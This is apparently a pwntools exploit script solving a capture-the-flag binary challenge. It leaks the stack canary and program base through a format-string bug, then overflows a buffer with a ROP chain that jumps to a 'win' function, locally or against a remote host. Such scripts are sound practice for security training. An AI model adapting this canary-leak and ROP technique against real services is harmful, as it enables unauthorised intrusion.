from pwn import *
import sys

BINARY = "chall"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def leak_canary_and_exe(self):
        p = self.p
        canary_position = b"%13$p"
        exe_position = b"%15$p"
        p.sendline(canary_position+b"|"+exe_position+b"|")
        p.recvuntil(b"canary?")
        canary_address = p.recvuntil(b"|")[:-1]
        exe_address = p.recvuntil(b"|")[:-1]
        return eval(canary_address), eval(exe_address)
        
    
    def send(self, content):
        p = self.p
        p.sendline(content)
    

x, p = init()

x.debug("break *vuln+100\nc")

canary, exe_leak = x.leak_canary_and_exe()
exe.address = exe_leak - (exe.sym['main']+0x1c)
log.info(f"{canary=:x}")
log.info(f"{exe.address=:x}")

pay = flat(
    cyclic(24),
    canary,
    0,
    ROP(exe).find_gadget(['pop rdi', 'ret'])[0],
    0xdeadbeef,
    ROP(exe).find_gadget(['ret'])[0],
    exe.sym['win'],
    
)
x.send(pay)

p.interactive()